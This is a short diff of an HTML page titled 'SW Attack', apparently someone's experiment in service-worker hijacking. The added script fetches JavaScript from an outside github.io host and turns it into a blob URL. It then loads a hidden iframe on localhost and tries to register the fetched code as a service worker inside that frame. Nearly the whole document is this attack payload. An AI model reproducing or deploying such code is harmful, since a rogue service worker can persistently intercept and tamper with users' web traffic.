@@ -1,17 +1,20 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>SW Attack</title>
-</head>
-<body>
-  <script>
-    if ('serviceWorker' in navigator) {
-      navigator.serviceWorker.register('./sw.js')
-        .then(() => {
-          console.log('Service Worker Registered');
-        });
-    }
+<script>
+  fetch("https://d1x0rhk5.github.io/web_test/sw.js")  
+    .then(response => response.text())
+    .then(script => {
+      const blob = new Blob([script], { type: "application/javascript" });
+      const url = URL.createObjectURL(blob);
+      
+      const iframe = document.createElement("iframe");
+      iframe.src = "http://localhost:8000/ind.html";
+      iframe.style.display = "none";
+      document.body.appendChild(iframe);
+      
+      iframe.onload = () => {
+        iframe.contentWindow.navigator.serviceWorker.register(url)
+          .then(() => console.log("✅ Service Worker 등록됨"))
+          .catch(err => console.error("❌ 등록 실패:", err));
+      };
+    });
   </script>
-</body>
-</html>
+  
